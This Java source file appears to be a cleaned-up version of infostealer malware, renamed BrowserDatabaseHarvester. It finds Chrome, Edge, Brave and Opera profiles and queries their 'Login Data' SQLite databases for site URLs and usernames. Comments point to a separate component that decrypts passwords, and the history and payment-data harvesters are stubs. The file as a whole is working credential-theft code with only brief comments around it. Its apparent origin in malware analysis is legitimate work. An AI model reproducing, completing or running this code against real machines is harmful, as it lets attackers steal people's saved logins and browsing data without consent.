import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * Cleaned BrowserDatabaseHarvester (formerly ì.java)
 * Responsible for locating and querying browser SQLite databases 
 * (Logins, History, Web Data) to extract sensitive information.
 */
public class BrowserDatabaseHarvester {

    private static final ConcurrentLinkedQueue<String> recoveredData = new ConcurrentLinkedQueue<>();

    public void run() {
        String localAppData = System.getenv("LOCALAPPDATA");
        List<File> browserPaths = getBrowserPaths(localAppData);

        List<CompletableFuture<Void>> tasks = new ArrayList<>();

        for (File browserPath : browserPaths) {
            tasks.add(CompletableFuture.runAsync(() -> harvestBrowserData(browserPath)));
        }

        // Wait for all harvesting tasks to complete
        CompletableFuture.allOf(tasks.toArray(new CompletableFuture[0])).join();
        
        // Final report of gathered credentials/data
        System.out.println("Harvesting complete. Found " + recoveredData.size() + " items.");
    }

    private List<File> getBrowserPaths(String localAppData) {
        List<File> paths = new ArrayList<>();
        String[] browsers = {"Google\\Chrome", "Microsoft\\Edge", "BraveSoftware\\Brave-Browser", "Opera Software\\Opera Stable"};
        
        for (String browser : browsers) {
            File path = new File(localAppData, browser + "\\User Data");
            if (path.exists()) paths.add(path);
        }
        return paths;
    }

    private void harvestBrowserData(File userDataPath) {
        // Scans all profiles (Default, Profile 1, etc.)
        File[] profiles = userDataPath.listFiles(f -> f.isDirectory() && (f.getName().equals("Default") || f.getName().startsWith("Profile")));
        if (profiles == null) return;

        for (File profile : profiles) {
            harvestLogins(new File(profile, "Login Data"));
            harvestHistory(new File(profile, "History"));
            harvestWebData(new File(profile, "Web Data"));
        }
    }

    private void harvestLogins(File loginDataDb) {
        if (!loginDataDb.exists()) return;
        
        try {
            // Malware typically copies the DB to a temp file first to avoid 'File In Use' errors
            String url = "jdbc:sqlite:" + loginDataDb.getAbsolutePath();
            try (Connection conn = DriverManager.getConnection(url);
                 Statement stmt = conn.createStatement();
                 ResultSet rs = stmt.executeQuery("SELECT origin_url, username_value, password_value FROM logins")) {
                
                while (rs.next()) {
                    String urlStr = rs.getString("origin_url");
                    String user = rs.getString("username_value");
                    // password_value is encrypted, handled by CredentialStealer
                    recoveredData.offer(urlStr + " | " + user);
                }
            }
        } catch (Exception ignored) {}
    }

    private void harvestHistory(File historyDb) {
        // Logic for history extraction...
    }

    private void harvestWebData(File webDataDb) {
        // Logic for Autofill and Payment data extraction...
    }
}
